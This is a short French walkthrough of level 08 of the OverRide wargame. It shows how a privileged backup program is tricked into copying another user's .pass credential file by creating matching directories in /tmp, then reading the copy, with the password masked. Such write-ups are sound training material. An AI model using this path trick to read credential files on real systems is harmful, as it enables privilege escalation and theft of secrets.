# Level 08

Apres avoir reecrit le code de l'executable on voit que c'est un programme qui fait un backup dans le repertoire `./backups/` du fichier passer en premier argument

Si on tente de passer le fichier `.pass` du user `level09` ca ne fonctionnera pas etant donne que le path `./backups/home/users/level09` n'existe pas et on n'a pas les permissions de creation de fichier/dossier

```bash
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:~$ mkdir -p ./backups/home/users/level09
mkdir: cannot create directory `./backups/home': Permission denied
```

Comme c'est le cas pour les projets `Snowcrash` et `Rainfall` on a les permissions dans le dossier `/tmp`

```bash
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
*************************************
```